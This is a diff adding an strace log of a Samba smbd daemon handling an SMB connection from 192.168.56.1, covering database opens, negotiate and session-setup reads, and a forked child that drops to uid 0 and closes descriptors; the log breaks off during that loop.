@@ -1,0 +1,2111 @@
+Process 4409 attached - interrupt to quit
+22:01:38.923098 select(24, [21 22 23], NULL, NULL, NULL) = 1 (in [22])
+22:01:44.762251 time(NULL)              = 1478487704
+22:01:44.762291 stat64("", 0xbfa4ccb0)  = -1 ENOENT (No such file or directory)
+22:01:44.762328 umask(022)              = 0
+22:01:44.762350 open("/var/log/samba/log.smbd", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, 0644) = 25
+22:01:44.762382 close(5)                = 0
+22:01:44.762393 umask(0)                = 022
+22:01:44.762404 dup2(25, 2)             = 2
+22:01:44.762419 stat64("/etc/samba/smb.conf", {st_mode=S_IFREG|0644, st_size=7932, ...}) = 0
+22:01:44.762470 open("/etc/printcap", O_RDONLY|O_LARGEFILE) = 5
+22:01:44.762492 read(5, "", 8192)       = 0
+22:01:44.762507 close(5)                = 0
+22:01:44.762523 open("/etc/printcap", O_RDONLY|O_LARGEFILE) = 5
+22:01:44.762540 read(5, "", 8192)       = 0
+22:01:44.762551 close(5)                = 0
+22:01:44.762574 accept(22, {sa_family=AF_INET, sin_port=htons(44120), sin_addr=inet_addr("192.168.56.1")}, [16]) = 5
+22:01:44.762637 getpeername(5, {sa_family=AF_INET, sin_port=htons(44120), sin_addr=inet_addr("192.168.56.1")}, [16]) = 0
+22:01:44.762762 fcntl64(5, F_GETFL)     = 0x2 (flags O_RDWR)
+22:01:44.762785 fcntl64(5, F_SETFL, O_RDWR) = 0
+22:01:44.762800 clone(Process 6361 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb78fa6f8) = 6361
+[pid  6361] 22:01:44.762922 close(21)   = 0
+[pid  6361] 22:01:44.762932 close(22)   = 0
+[pid  6361] 22:01:44.762943 close(0)    = 0
+[pid  6361] 22:01:44.762953 close(1)    = 0
+[pid  6361] 22:01:44.762968 open("/dev/null", O_RDWR|O_LARGEFILE) = 0
+[pid  6361] 22:01:44.762986 open("/dev/null", O_RDWR|O_LARGEFILE) = 1
+[pid  6361] 22:01:44.763025 setsockopt(5, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+[pid  6361] 22:01:44.763047 setsockopt(5, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+[pid  6361] 22:01:44.763071 getpeername(5, {sa_family=AF_INET, sin_port=htons(44120), sin_addr=inet_addr("192.168.56.1")}, [16]) = 0
+[pid  6361] 22:01:44.763149 munmap(0xb786f000, 696) = 0
+[pid  6361] 22:01:44.763164 close(20)   = 0
+[pid  6361] 22:01:44.763174 open("/var/lib/samba/ntforms.tdb", O_RDWR|O_LARGEFILE) = 20
+[pid  6361] 22:01:44.763195 fstat64(20, {st_mode=S_IFREG|0600, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.763229 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 20, 0) = 0xb789e000
+[pid  6361] 22:01:44.763246 munmap(0xb7870000, 8192) = 0
+[pid  6361] 22:01:44.763256 close(19)   = 0
+[pid  6361] 22:01:44.763266 open("/var/lib/samba/ntprinters.tdb", O_RDWR|O_LARGEFILE) = 19
+[pid  6361] 22:01:44.763309 fstat64(19, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.763351 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 19, 0) = 0xb7870000
+[pid  6361] 22:01:44.763376 munmap(0xb7892000, 8192) = 0
+[pid  6361] 22:01:44.763387 close(18)   = 0
+[pid  6361] 22:01:44.763396 open("/var/lib/samba/ntdrivers.tdb", O_RDWR|O_LARGEFILE) = 18
+[pid  6361] 22:01:44.763415 fstat64(18, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.763447 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 18, 0) = 0xb7892000
+[pid  6361] 22:01:44.763458 munmap(0xb7894000, 8192) = 0
+[pid  6361] 22:01:44.763469 close(17)   = 0
+[pid  6361] 22:01:44.763479 open("/var/run/samba/registry.tdb", O_RDWR|O_LARGEFILE) = 17
+[pid  6361] 22:01:44.763499 fstat64(17, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.763531 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 17, 0) = 0xb7894000
+[pid  6361] 22:01:44.763559 munmap(0xb7896000, 696) = 0
+[pid  6361] 22:01:44.763579 close(16)   = 0
+[pid  6361] 22:01:44.763598 open("/var/run/samba/gencache.tdb", O_RDWR|O_LARGEFILE) = 16
+[pid  6361] 22:01:44.763641 fstat64(16, {st_mode=S_IFREG|0644, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.763683 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 16, 0) = 0xb7896000
+[pid  6361] 22:01:44.763693 munmap(0xb7897000, 8192) = 0
+[pid  6361] 22:01:44.763704 close(15)   = 0
+[pid  6361] 22:01:44.763714 open("/var/lib/samba/share_info.tdb", O_RDWR|O_LARGEFILE) = 15
+[pid  6361] 22:01:44.763755 fstat64(15, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.763788 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 15, 0) = 0xb7897000
+[pid  6361] 22:01:44.763803 munmap(0xb7899000, 696) = 0
+[pid  6361] 22:01:44.763814 close(14)   = 0
+[pid  6361] 22:01:44.763825 open("/var/run/samba/deferred_open.tdb", O_RDWR|O_LARGEFILE) = 14
+[pid  6361] 22:01:44.763846 fstat64(14, {st_mode=S_IFREG|0644, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.763879 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 14, 0) = 0xb7899000
+[pid  6361] 22:01:44.763890 munmap(0xb789c000, 696) = 0
+[pid  6361] 22:01:44.763901 close(13)   = 0
+[pid  6361] 22:01:44.763911 open("/var/run/samba/locking.tdb", O_RDWR|O_LARGEFILE) = 13
+[pid  6361] 22:01:44.763930 fstat64(13, {st_mode=S_IFREG|0644, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.763963 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 13, 0) = 0xb789c000
+[pid  6361] 22:01:44.763974 munmap(0xb789d000, 696) = 0
+[pid  6361] 22:01:44.763989 close(12)   = 0
+[pid  6361] 22:01:44.763999 open("/var/run/samba/brlock.tdb", O_RDWR|O_LARGEFILE) = 12
+[pid  6361] 22:01:44.764019 fstat64(12, {st_mode=S_IFREG|0644, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.764053 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 12, 0) = 0xb789d000
+[pid  6361] 22:01:44.764064 munmap(0xb786d000, 8192) = 0
+[pid  6361] 22:01:44.764075 close(11)   = 0
+[pid  6361] 22:01:44.764085 open("/var/run/samba/connections.tdb", O_RDWR|O_LARGEFILE) = 11
+[pid  6361] 22:01:44.764105 fstat64(11, {st_mode=S_IFREG|0644, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.764138 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 11, 0) = 0xb786e000
+[pid  6361] 22:01:44.764151 munmap(0xb789f000, 696) = 0
+[pid  6361] 22:01:44.764162 close(10)   = 0
+[pid  6361] 22:01:44.764172 open("/var/run/samba/sessionid.tdb", O_RDWR|O_LARGEFILE) = 10
+[pid  6361] 22:01:44.764191 fstat64(10, {st_mode=S_IFREG|0644, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.764224 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 10, 0) = 0xb789f000
+[pid  6361] 22:01:44.764235 munmap(0xb7c28000, 696) = 0
+[pid  6361] 22:01:44.764248 close(9)    = 0
+[pid  6361] 22:01:44.764259 open("/var/run/samba/messages.tdb", O_RDWR|O_LARGEFILE) = 9
+[pid  6361] 22:01:44.764278 fstat64(9, {st_mode=S_IFREG|0600, st_size=696, ...}) = 0
+[pid  6361] 22:01:44.764311 mmap2(NULL, 696, PROT_READ|PROT_WRITE, MAP_SHARED, 9, 0) = 0xb7c28000
+[pid  6361] 22:01:44.764322 munmap(0xb7872000, 8192) = 0
+[pid  6361] 22:01:44.764333 close(6)    = 0
+[pid  6361] 22:01:44.764343 open("/var/lib/samba/group_mapping.tdb", O_RDWR|O_LARGEFILE) = 6
+[pid  6361] 22:01:44.764364 fstat64(6, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.764397 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0xb7872000
+[pid  6361] 22:01:44.764412 munmap(0xb789a000, 8192) = 0
+[pid  6361] 22:01:44.764424 close(7)    = 0
+[pid  6361] 22:01:44.764434 open("/var/lib/samba/account_policy.tdb", O_RDWR|O_LARGEFILE) = 7
+[pid  6361] 22:01:44.764454 fstat64(7, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.764487 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 7, 0) = 0xb789a000
+[pid  6361] 22:01:44.764502 munmap(0xb78a0000, 8192) = 0
+[pid  6361] 22:01:44.764513 close(4)    = 0
+[pid  6361] 22:01:44.764523 open("/var/lib/samba/secrets.tdb", O_RDWR|O_LARGEFILE) = 4
+[pid  6361] 22:01:44.764542 fstat64(4, {st_mode=S_IFREG|0600, st_size=8192, ...}) = 0
+[pid  6361] 22:01:44.764575 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 4, 0) = 0xb78a0000
+[pid  6361] 22:01:44.764664 stat64("", 0xbfa4df90) = -1 ENOENT (No such file or directory)
+[pid  6361] 22:01:44.764681 umask(022)  = 0
+[pid  6361] 22:01:44.764699 open("/var/log/samba/log.192.168.56.1", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, 0644) = 21
+[pid  6361] 22:01:44.764725 close(25)   = 0
+[pid  6361] 22:01:44.764735 umask(0)    = 022
+[pid  6361] 22:01:44.764745 dup2(21, 2) = 2
+[pid  6361] 22:01:44.764759 stat64("/etc/samba/smb.conf", {st_mode=S_IFREG|0644, st_size=7932, ...}) = 0
+[pid  6361] 22:01:44.764811 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 22
+[pid  6361] 22:01:44.764833 setsockopt(22, SOL_SOCKET, SO_REUSEADDR, [0], 4) = 0
+[pid  6361] 22:01:44.764848 bind(22, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
+[pid  6361] 22:01:44.764926 getsockname(22, {sa_family=AF_INET, sin_port=htons(56418), sin_addr=inet_addr("127.0.0.1")}, [16]) = 0
+[pid  6361] 22:01:44.764978 time(NULL)  = 1478487704
+[pid  6361] 22:01:44.765002 stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+[pid  6361] 22:01:44.765049 gettimeofday({1478487704, 765053}, NULL) = 0
+[pid  6361] 22:01:44.765065 time(NULL)  = 1478487704
+[pid  6361] 22:01:44.765079 brk(0xb8017000) = 0xb8017000
+[pid  6361] 22:01:44.765128 pipe([25, 26]) = 0
+[pid  6361] 22:01:44.765143 fcntl64(25, F_GETFL) = 0 (flags O_RDONLY)
+[pid  6361] 22:01:44.765154 fcntl64(25, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
+[pid  6361] 22:01:44.765165 fcntl64(26, F_GETFL) = 0x1 (flags O_WRONLY)
+[pid  6361] 22:01:44.765175 fcntl64(26, F_SETFL, O_WRONLY|O_NONBLOCK) = 0
+[pid  6361] 22:01:44.765188 select(26, [5 22 25], NULL, NULL, {60, 0}) = 1 (in [5], left {60, 0})
+[pid  6361] 22:01:44.765210 read(5, "\0\0\0T", 4) = 4
+[pid  6361] 22:01:44.765226 read(5, "\377SMBr\0\0\0\0\30\1\300\0\0\0\0\0\0\0\0\0\0\0\0\0\0\304"..., 84) = 84
+[pid  6361] 22:01:44.765253 gettimeofday({1478487704, 765258}, NULL) = 0
+[pid  6361] 22:01:44.765291 geteuid32() = 0
+[pid  6361] 22:01:44.765300 getegid32() = 0
+[pid  6361] 22:01:44.765312 setgroups32(0, []) = 0
+[pid  6361] 22:01:44.765328 setresgid32(-1, 0, -1) = 0
+[pid  6361] 22:01:44.765339 getegid32() = 0
+[pid  6361] 22:01:44.765349 setresuid32(0, 0, -1) = 0
+[pid  6361] 22:01:44.765359 geteuid32() = 0
+[pid  6361] 22:01:44.765377 stat64("", 0xbfa4de40) = -1 ENOENT (No such file or directory)
+[pid  6361] 22:01:44.765390 umask(022)  = 0
+[pid  6361] 22:01:44.765410 open("/var/log/samba/log.192.168.56.1", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, 0644) = 27
+[pid  6361] 22:01:44.765431 close(21)   = 0
+[pid  6361] 22:01:44.765441 umask(0)    = 022
+[pid  6361] 22:01:44.765451 dup2(27, 2) = 2
+[pid  6361] 22:01:44.765462 stat64("/etc/samba/smb.conf", {st_mode=S_IFREG|0644, st_size=7932, ...}) = 0
+[pid  6361] 22:01:44.765506 time(NULL)  = 1478487704
+[pid  6361] 22:01:44.765519 getpeername(5, {sa_family=AF_INET, sin_port=htons(44120), sin_addr=inet_addr("192.168.56.1")}, [16]) = 0
+[pid  6361] 22:01:44.765566 fcntl64(11, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=212, len=1}, 0xbfa4df54) = 0
+[pid  6361] 22:01:44.765590 fcntl64(11, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=164, len=1}, 0xbfa4dac4) = 0
+[pid  6361] 22:01:44.765611 fcntl64(11, F_SETLKW64, {type=F_UNLCK, whence=SEEK_SET, start=164, len=1}, 0xbfa4dad4) = 0
+[pid  6361] 22:01:44.765629 fcntl64(11, F_SETLKW64, {type=F_UNLCK, whence=SEEK_SET, start=212, len=1}, 0xbfa4df64) = 0
+[pid  6361] 22:01:44.765648 stat64("", 0xbfa4de40) = -1 ENOENT (No such file or directory)
+[pid  6361] 22:01:44.765660 umask(022)  = 0
+[pid  6361] 22:01:44.765676 open("/var/log/samba/log.192.168.56.1", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, 0644) = 21
+[pid  6361] 22:01:44.765697 close(27)   = 0
+[pid  6361] 22:01:44.765706 umask(0)    = 022
+[pid  6361] 22:01:44.765716 dup2(21, 2) = 2
+[pid  6361] 22:01:44.765727 stat64("/etc/samba/smb.conf", {st_mode=S_IFREG|0644, st_size=7932, ...}) = 0
+[pid  6361] 22:01:44.765767 time(NULL)  = 1478487704
+[pid  6361] 22:01:44.765812 read(3, "\0226\203\"\24\346E\261", 8) = 8
+[pid  6361] 22:01:44.765838 write(5, "\0\0\0a\377SMBr\0\0\0\0\210\1\300\0\0\0\0\0\0\0\0\0\0\0"..., 101) = 101
+[pid  6361] 22:01:44.765977 select(26, [5 22 25], NULL, NULL, {60, 0}) = 1 (in [5], left {59, 980000})
+[pid  6361] 22:01:44.781158 read(5, "\0\0\1\31", 4) = 4
+[pid  6361] 22:01:44.781298 read(5, "\377SMBs\0\0\0\0\30\1 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\304"..., 281) = 281
+[pid  6361] 22:01:44.781347 gettimeofday({1478487704, 781355}, NULL) = 0
+[pid  6361] 22:01:44.781370 geteuid32() = 0
+[pid  6361] 22:01:44.781380 getegid32() = 0
+[pid  6361] 22:01:44.781390 setgroups32(0, []) = 0
+[pid  6361] 22:01:44.781403 setresgid32(-1, 0, -1) = 0
+[pid  6361] 22:01:44.781414 getegid32() = 0
+[pid  6361] 22:01:44.781424 setresuid32(0, 0, -1) = 0
+[pid  6361] 22:01:44.781434 geteuid32() = 0
+[pid  6361] 22:01:44.781464 stat64("", 0xbfa4cf90) = -1 ENOENT (No such file or directory)
+[pid  6361] 22:01:44.781480 umask(022)  = 0
+[pid  6361] 22:01:44.781499 open("/var/log/samba/log.192.168.56.1", O_WRONLY|O_CREAT|O_APPEND|O_LARGEFILE, 0644) = 27
+[pid  6361] 22:01:44.781525 close(21)   = 0
+[pid  6361] 22:01:44.781536 umask(0)    = 022
+[pid  6361] 22:01:44.781546 dup2(27, 2) = 2
+[pid  6361] 22:01:44.781558 stat64("/etc/samba/smb.conf", {st_mode=S_IFREG|0644, st_size=7932, ...}) = 0
+[pid  6361] 22:01:44.781621 gettimeofday({1478487704, 781626}, NULL) = 0
+[pid  6361] 22:01:44.781638 open("/tmp/smb.KxP5CU", O_RDWR|O_CREAT|O_EXCL|O_LARGEFILE, 0600) = 21
+[pid  6361] 22:01:44.781676 unlink("/tmp/smb.KxP5CU") = 0
+[pid  6361] 22:01:44.781698 rt_sigaction(SIGCHLD, {0xb7e24580, [CHLD], SA_RESTART}, {0xb7e24590, [CHLD], SA_RESTART}, 8) = 0
+[pid  6361] 22:01:44.781728 clone(Process 6362 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb78fa6f8) = 6362
+[pid  6362] 22:01:44.781875 rt_sigaction(SIGCHLD, {0xb7e24590, [CHLD], SA_RESTART}, {0xb7e24580, [CHLD], SA_RESTART}, 8) = 0
+[pid  6362] 22:01:44.781901 close(1)    = 0
+[pid  6362] 22:01:44.781912 dup2(21, 1) = 1
+[pid  6362] 22:01:44.781928 setresuid32(0, 0, 0) = 0
+[pid  6362] 22:01:44.781939 setuid32(0) = 0
+[pid  6362] 22:01:44.781948 geteuid32() = 0
+[pid  6362] 22:01:44.781958 getuid32()  = 0
+[pid  6362] 22:01:44.781968 setresgid32(0, 0, 0) = 0
+[pid  6362] 22:01:44.781978 setgid32(0) = 0
+[pid  6362] 22:01:44.781987 getegid32() = 0
+[pid  6362] 22:01:44.781997 getgid32()  = 0
+[pid  6362] 22:01:44.782007 setresgid32(0, 0, 0) = 0
+[pid  6362] 22:01:44.782017 setgid32(0) = 0
+[pid  6362] 22:01:44.782026 setresuid32(0, 0, 0) = 0
+[pid  6362] 22:01:44.782036 setuid32(0) = 0
+[pid  6362] 22:01:44.782046 geteuid32() = 0
+[pid  6362] 22:01:44.782055 getuid32()  = 0
+[pid  6362] 22:01:44.782064 getegid32() = 0
+[pid  6362] 22:01:44.782073 getgid32()  = 0
+[pid  6362] 22:01:44.782083 getuid32()  = 0
+[pid  6362] 22:01:44.782092 geteuid32() = 0
+[pid  6362] 22:01:44.782101 getgid32()  = 0
+[pid  6362] 22:01:44.782110 getegid32() = 0
+[pid  6362] 22:01:44.782120 close(3)    = 0
+[pid  6362] 22:01:44.782130 close(4)    = 0
+[pid  6362] 22:01:44.782140 close(5)    = 0
+[pid  6362] 22:01:44.782149 close(6)    = 0
+[pid  6362] 22:01:44.782159 close(7)    = 0
+[pid  6362] 22:01:44.782168 close(8)    = 0
+[pid  6362] 22:01:44.782178 close(9)    = 0
+[pid  6362] 22:01:44.782188 close(10)   = 0
+[pid  6362] 22:01:44.782198 close(11)   = 0
+[pid  6362] 22:01:44.782207 close(12)   = 0
+[pid  6362] 22:01:44.782217 close(13)   = 0
+[pid  6362] 22:01:44.782227 close(14)   = 0
+[pid  6362] 22:01:44.782236 close(15)   = 0
+[pid  6362] 22:01:44.782246 close(16)   = 0
+[pid  6362] 22:01:44.782256 close(17)   = 0
+[pid  6362] 22:01:44.782265 close(18)   = 0
+[pid  6362] 22:01:44.782275 close(19)   = 0
+[pid  6362] 22:01:44.782284 close(20)   = 0
+[pid  6362] 22:01:44.782294 close(21)   = 0
+[pid  6362] 22:01:44.782305 close(22)   = 0
+[pid  6362] 22:01:44.782314 close(23)   = 0
+[pid  6362] 22:01:44.782324 close(24)   = 0
+[pid  6362] 22:01:44.782334 close(25)   = 0
+[pid  6362] 22:01:44.782344 close(26)   = 0
+[pid  6362] 22:01:44.782354 close(27)   = 0
+[pid  6362] 22:01:44.782363 close(28)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782374 close(29)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782384 close(30)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782394 close(31)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782404 close(32)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782414 close(33)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782424 close(34)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782433 close(35)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782443 close(36)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782453 close(37)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782463 close(38)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782473 close(39)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782483 close(40)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782493 close(41)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782503 close(42)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782513 close(43)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782523 close(44)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782532 close(45)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782542 close(46)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782552 close(47)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782562 close(48)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782571 close(49)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782581 close(50)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782591 close(51)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782600 close(52)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782610 close(53)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782620 close(54)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782630 close(55)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782640 close(56)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782649 close(57)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782659 close(58)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782669 close(59)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782678 close(60)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782688 close(61)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782698 close(62)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782708 close(63)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782717 close(64)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782727 close(65)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782737 close(66)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782746 close(67)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782756 close(68)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782766 close(69)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782776 close(70)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782785 close(71)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782795 close(72)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782805 close(73)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782814 close(74)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782824 close(75)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782834 close(76)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782843 close(77)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782853 close(78)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782863 close(79)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782873 close(80)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782882 close(81)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782892 close(82)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782901 close(83)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782911 close(84)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782921 close(85)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782931 close(86)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782940 close(87)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782950 close(88)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782960 close(89)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782969 close(90)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782979 close(91)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782989 close(92)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.782998 close(93)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783008 close(94)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783018 close(95)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783028 close(96)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783038 close(97)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783047 close(98)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783057 close(99)   = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783067 close(100)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783077 close(101)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783086 close(102)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783096 close(103)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783106 close(104)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783116 close(105)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783125 close(106)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783135 close(107)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783145 close(108)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783155 close(109)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783165 close(110)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783175 close(111)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783184 close(112)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783194 close(113)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783204 close(114)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783214 close(115)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783223 close(116)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783233 close(117)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783243 close(118)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783252 close(119)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783262 close(120)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783272 close(121)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783282 close(122)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783291 close(123)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783301 close(124)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783311 close(125)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783321 close(126)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783331 close(127)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783340 close(128)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783350 close(129)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783360 close(130)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783370 close(131)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783379 close(132)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783389 close(133)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783399 close(134)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783409 close(135)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783418 close(136)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783428 close(137)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783438 close(138)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783447 close(139)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783457 close(140)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783467 close(141)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783477 close(142)  = -1 EBADF (Bad file descriptor)
